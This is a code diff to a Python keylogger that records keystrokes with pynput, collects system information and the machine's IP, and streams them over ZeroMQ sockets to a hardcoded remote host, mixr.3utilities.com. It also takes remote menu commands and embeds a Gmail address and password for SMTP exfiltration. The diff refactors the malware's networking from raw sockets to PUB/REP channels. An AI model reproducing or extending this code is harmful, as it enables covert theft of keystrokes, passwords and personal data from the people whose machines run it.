@@ -1,4 +1,5 @@
-import socket
+import socket, zmq
+import time
 import getpass, os, platform, sys
 from utils import *
 from pynput.keyboard import Listener
@@ -21,15 +22,18 @@ elif sys_name == 'linux' or sys_name == 'darwin':
 else:
 	sys.exit(1)
 
-class Client:
-	def __init__(self, ip_address, port):
+class Communication:
+	def __init__(self, ip_address, port_stream, port_interact):
 		self.ip_address = ip_address
-		self.port = port
-		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.port_stream = port_stream
+		self.port_interact = port_interact
 
 
-	def connect(self):
-		self.client.connect((self.ip_address, self.port))
+	def connect2stream(self):
+		self.stream_context = zmq.Context()
+		self.socket_stream = self.stream_context.socket(zmq.PUB)
+		self.socket_stream.connect('tcp://' + self.ip_address + ':' + str(self.port_stream))
+
 		try:
 			self.pc_ip = socket.gethostbyname(socket.gethostname())
 		except socket.gaierror:
@@ -40,6 +44,15 @@ class Client:
 		except:
 			self.pc_ip = "Unknown"
 
+		time.sleep(0.1)
+		self.socket_stream.send_string('OK')
+
+
+	def connect2interaction(self):
+		self.interact_context = zmq.Context()
+		self.socket_interact = self.interact_context.socket(zmq.REP)
+		self.socket_interact.connect('tcp://' + self.ip_address + ':' + str(self.port_interact))
+
 
 class KeyLoggerClient:
 	def __init__(self, connection, email_address, email_password):
@@ -48,10 +61,10 @@ class KeyLoggerClient:
 		self.smtp_alias = 'smtp.gmail.com'
 		self.smtp_port = 587
 		self.keys = None
-		if isinstance(connection, Client):
+		if isinstance(connection, Communication):
 			self.connection = connection
 		else:
-			raise TypeError("\'connection\' parameter should be \'Client\' type!")
+			raise TypeError("\'connection\' parameter should be \'Communication\' type!")
 
 
 	def on_release(self, key):
@@ -64,7 +77,7 @@ class KeyLoggerClient:
 		data = get_system_information(sys_name)
 		data[1].append(self.connection.pc_ip)
 		data = str(data)
-		self.connection.client.sendall(data.encode())
+		self.connection.socket_stream.send_string(data)
 
 		keyboard_listener = Listener(on_release=self.on_release)
 		keyboard_listener.start()
@@ -78,10 +91,11 @@ class KeyLoggerClient:
 				data = str(data)
 
 				try:
-					self.connection.client.sendall(data.encode())
+					self.connection.socket_stream.send_string(data)
 				except:
 					stop_threads = True
-					self.connection.client.close()
+					self.connection.socket_stream.close()
+					self.connection.socket_interact.close()
 					break
 
 		stop_threads = True
@@ -143,10 +157,10 @@ class KeyLoggerClient:
 class MenuHandlerClient(threading.Thread):
 	def __init__(self, connection):
 		super(MenuHandlerClient, self).__init__()
-		if isinstance(connection, Client):
+		if isinstance(connection, Communication):
 			self.connection = connection
 		else:
-			raise TypeError("\'connection\' parameter should be \'Client\' type!")
+			raise TypeError("\'connection\' parameter should be \'Communication\' type!")
 
 
 	def run(self):
@@ -154,7 +168,7 @@ class MenuHandlerClient(threading.Thread):
 
 		while True:
 			try:
-				option = self.connection.client.recv(24).decode()
+				option = self.connection.socket_interact.recv_string()
 			except:
 				break
 
@@ -172,7 +186,7 @@ class MenuHandlerClient(threading.Thread):
 					data.append("Error")
 
 				try:
-					self.connection.client.sendall(str(data).encode())
+					self.connection.socket_interact.send_string(str(data))
 				except:
 					break
 			elif option == '2':
@@ -188,7 +202,7 @@ class MenuHandlerClient(threading.Thread):
 					data.append("Error")
 
 				try:
-					self.connection.client.sendall(str(data).encode())
+					self.connection.socket_interact.send_string(str(data))
 				except:
 					break
 			elif option == '3':
@@ -204,30 +218,35 @@ class MenuHandlerClient(threading.Thread):
 					data.append("Error")
 
 				try:
-					self.connection.client.sendall(str(data).encode())
+					self.connection.socket_interact.send_string(str(data))
 				except:
 					break
 			elif option == '4' or stop_threads:
 				data = ["close", date_time, "Exit"]
-				self.connection.client.sendall(str(data).encode())
-				self.connection.client.close()
+				self.connection.socket_stream.send_string(str(data))
+				self.connection.socket_stream.close()
+				self.connection.socket_interact.close()
 				break
 
 
 def main():
 	global stop_threads
 
-	client = Client(ip_address='mixr.3utilities.com', port=10001)
+	communication = Communication(ip_address='mixr.3utilities.com', port_stream=10001, port_interact=10002)
 
 	try:
-		client.connect()
+		communication.connect2stream()
+		communication.connect2interaction()
 
-		menu_handler = MenuHandlerClient(connection=client)
+		menu_handler = MenuHandlerClient(connection=communication)
 		menu_handler.start()
 
-		key_logger = KeyLoggerClient(connection=client, email_address='salamander.hck@gmail.com', email_password='0xzedff4343d2a')
+		key_logger = KeyLoggerClient(connection=communication, email_address='salamander.hck@gmail.com', email_password='0xzedff4343d2a')
 		key_logger.run()
 	except TypeError as err:
+		sys.exit(1)
+	except Exception as e:
+		print(e)
 		sys.exit(1)
 
 
